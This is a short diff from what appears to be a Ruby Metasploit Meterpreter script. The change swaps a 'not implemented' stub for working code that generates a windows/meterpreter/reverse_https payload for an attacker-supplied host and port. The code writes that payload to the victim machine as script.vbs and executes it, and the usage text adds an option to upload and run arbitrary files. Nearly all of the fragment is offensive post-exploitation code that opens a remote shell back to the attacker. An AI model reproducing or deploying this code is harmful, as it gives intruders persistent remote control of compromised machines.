@@ -46,11 +46,14 @@ when "-f"
     raise Rex::Script::Completed
   end
 when "-g"
-  print_status "Not yet implemented"
-  raise Rex::Script::Completed
+  filename = "script.vbs"
+  path_on_victim_host += filename
+  payload = generate_payload "windows/meterpreter/reverse_https", args[1], args[2], client
+  write_payload payload, path_on_victim_host, client
+  vbs_reverse_https path_on_victim_host, client
 else
   print_status "Usage:" 
-  print_status "-f [port] Opens a specified Port or the Meterpreter-Session Port"
-  print_status "-g generate new .vbs-ReserveHttps payload: rhost rport lhost lport"
+  print_status "-f file: Uploads specified File and Executes it"
+  print_status "-g lhost lport: generate new .vbs-ReserveHttps payload with specified Parameters"
 end
 
